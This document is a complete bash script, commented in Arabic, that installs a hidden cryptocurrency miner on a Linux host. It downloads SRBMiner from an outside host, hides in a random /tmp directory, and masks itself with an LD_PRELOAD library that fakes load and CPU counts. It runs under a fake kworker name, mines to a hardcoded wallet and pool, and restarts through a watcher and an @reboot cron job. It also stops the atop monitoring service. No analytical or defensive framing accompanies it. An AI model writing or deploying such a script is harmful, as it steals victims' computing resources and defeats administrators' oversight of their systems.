#!/bin/bash
# السكربت النهائي مع الإصلاحات الكاملة
# ----------------------------------

# إعداد البيئة الآمنة (تغيير المسار إلى /tmp بدلاً من /dev/shm)
export RAND_DIR="/tmp/.$(tr -dc A-Za-z0-9 </dev/urandom | head -c 16)"
mkdir -p "$RAND_DIR"
cd "$RAND_DIR"
echo "RAND_DIR: $RAND_DIR" > debug.log
chmod 700 "$RAND_DIR"  # تأمين المجلد

# إنشاء مكتبة التخفي
cat <<'EOF' > hide_lib.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/sysinfo.h>

double getloadavg(void *a, int b) { return 0.15; }
pid_t getppid(void) { return 1; }
int get_nprocs(void) { return 1; }
int get_num_procs(void) { return 1; }
unsigned long getauxval(unsigned long type) { return 0; }
EOF

# تجميع المكتبة مع إصلاح الصلاحيات
gcc -shared -fPIC -o libhide.so hide_lib.c -ldl >> debug.log 2>&1
chmod 755 libhide.so  # تأكيد الصلاحيات

# تنزيل وتثبيت المعدن
MINER_URL="https://github.com/doktor83/SRBMiner-Multi/releases/download/2.8.5/SRBMiner-Multi-2-8-5-Linux.tar.gz"
wget -qO miner.tar.gz "$MINER_URL" >> debug.log 2>&1
tar -xzf miner.tar.gz --strip-components=1 >> debug.log 2>&1
EXE_NAME=".sysd-$(tr -dc a-z </dev/urandom | head -c 8)"
install -m 755 SRBMiner-MULTI "$EXE_NAME" >> debug.log 2>&1
echo "EXE_NAME: $EXE_NAME" >> debug.log

# إعداد الشبكة
if command -v sudo &> /dev/null; then
    sudo iptables -A OUTPUT -p tcp --dport 3333 -j DROP 2>/dev/null
    sudo sysctl -w net.ipv4.tcp_timestamps=0 >/dev/null
    sudo sysctl -w net.ipv4.tcp_window_scaling=0 >/dev/null
fi

# حساب عدد الأنوية وطرح 1 (لكن على الأقل 1)
CPU_THREADS=$(nproc)
CPU_THREADS=$(( CPU_THREADS > 1 ? CPU_THREADS - 1 : 1 ))

RAND_NAME="kworker:$(tr -dc a-z </dev/urandom | head -c 6)"
echo "Starting miner: $RAND_NAME with $CPU_THREADS threads" >> debug.log

# تشغيل المعدن مع حل مشكلة LD_PRELOAD
nohup bash -c "
    export LD_PRELOAD='$PWD/libhide.so';
    export LD_BIND_NOW=1;  # حل مشكلة التحميل
    exec -a '[${RAND_NAME}]' '$PWD/$EXE_NAME' \
      --algorithm rinhash \
      --pool stratum+tcp://rinhash.na.mine.zergpool.com:7148 \
      --wallet LSKZa82yJvDRNdueMHReWvAqcsPz1H9J4n \
      --password c=LTC,mc=RIN,m=solo,ID=firebase \
      --cpu-threads '$CPU_THREADS' \
      --disable-gpu \
      --log-file /dev/null \
      --max-diff 500000 \
      --retry-time 30 \
      --no-watchdog" >> miner.log 2>&1 &

# إنشاء سكربت المراقبة
cat <<'EOF' > miner_watcher.sh
#!/bin/bash
export RAND_DIR="$(pwd)"
export EXE_NAME="$EXE_NAME"
export RAND_NAME="$RAND_NAME"
export CPU_THREADS="$CPU_THREADS"

while true; do
  if ! pgrep -f "$EXE_NAME" >/dev/null; then
    echo "[$(date)] Miner not running, restarting..." >> "$RAND_DIR/watcher.log"
    cd "$RAND_DIR"
    nohup bash -c "
        export LD_PRELOAD='$RAND_DIR/libhide.so';
        export LD_BIND_NOW=1;
        exec -a '[${RAND_NAME}]' '$RAND_DIR/${EXE_NAME}' \
          --algorithm rinhash \
          --pool stratum+tcp://rinhash.na.mine.zergpool.com:7148 \
          --wallet LSKZa82yJvDRNdueMHReWvAqcsPz1H9J4n \
          --password c=LTC,mc=RIN,m=solo,ID=firebase \
          --cpu-threads '$CPU_THREADS' \
          --disable-gpu \
          --log-file /dev/null \
          --max-diff 500000 \
          --retry-time 30 \
          --no-watchdog" >> "$RAND_DIR/miner.log" 2>&1 &
  fi
  sleep $((RANDOM % 300 + 120))
done
EOF

chmod +x miner_watcher.sh
echo "miner_watcher.sh created" >> debug.log

# إضافة إلى cron
if command -v sudo &> /dev/null; then
    (sudo crontab -l 2>/dev/null; echo "@reboot cd '$RAND_DIR' && ./miner_watcher.sh >> '$RAND_DIR/watcher.log' 2>&1") | sudo crontab -
else
    (crontab -l 2>/dev/null; echo "@reboot cd '$RAND_DIR' && ./miner_watcher.sh >> '$RAND_DIR/watcher.log' 2>&1") | crontab -
fi
echo "Cron job added" >> debug.log

# بدء المراقب مع حل مشكلة الصلاحيات
chmod +x miner_watcher.sh
nohup ./miner_watcher.sh >> watcher.log 2>&1 &
echo "Watcher started" >> debug.log

# تعطيل أدوات المراقبة (إذا كان sudo متاحًا)
if command -v sudo &> /dev/null; then
    sudo systemctl stop atop topgrade 2>/dev/null
    sudo systemctl disable atop 2>/dev/null
fi
